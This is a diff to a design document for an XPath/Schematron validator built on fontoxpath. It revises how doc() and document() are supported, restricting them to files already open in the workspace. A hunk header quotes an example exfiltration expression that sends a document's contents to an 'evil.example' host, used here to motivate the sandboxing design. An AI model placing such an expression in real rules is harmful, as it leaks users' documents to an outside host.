@@ -210,8 +210,10 @@ evaluateXPathToNodes(rule.context, contextNode, facade, variables, options);
 - **`queryBinding`**: support `xpath2`/`xpath3`/`xpath31` and the common `xslt2` subset. Note the
   semantic drift when running an `xslt` (XPath 1.0) schema under 3.1 — general comparisons stay
   existential, but untyped string-vs-number comparisons differ. Warn on `queryBinding="xslt"`.
-- **`fn:doc()`** is not available by default and real-world Schematron does use `document()` to pull in
-  code lists. Plan an explicit, consent-gated resource-resolver injection (§5).
+- **`fn:doc()`** — real-world Schematron uses `document()` to pull in code lists, and fontoxpath does
+  not implement the function at all. We register `doc()` and `document()` into the standard function
+  namespace ourselves, with a resolver scoped to files already open in the workspace: a rule reads
+  `codes.xml` if the user opened `codes.xml`, and nothing else (§5).
 
 ### 3.4 The accepted limitation
 
@@ -278,12 +280,15 @@ doc(concat('https://evil.example/', encode-for-uri(string(/))))
 cookies. The same applies to Schematron **embedded in `xs:appinfo`**, which the user never consciously
 chose to run.
 
-**Our fontoxpath interpreter is safe by construction**: fontoxpath has no `fn:doc()` unless you supply
-a resolver, and no filesystem or network access at all. This is a second, independent justification for
-§3.2.
+**Our fontoxpath interpreter is safe by construction**: fontoxpath does not implement `fn:doc()` —
+registering one is what supplies it — and has no filesystem or network access at all. This is a
+second, independent justification for §3.2.
 
-If a resource resolver is ever added for `document()` support, it must be consent-gated per-URL and
-restricted to the catalogue, never a general `fetch`.
+The `doc()`/`document()` we register (Phase 9 step 4) keeps that property: its resolver looks up a
+per-evaluation map of documents already open in the workspace and nothing else. A name that is not
+an open file is a loud error, never a fetch and never an empty sequence; there is no code path from
+a rule to the disk or the network, and callers that pass no map — XSD 1.1 assertions, the syntax
+checker — get a `doc()` that only throws.
 
 Should XSLT execution ever become necessary despite all of the above, the only acceptable shape is a
 **null-origin sandboxed iframe** (`sandbox="allow-scripts"`, *without* `allow-same-origin`) under
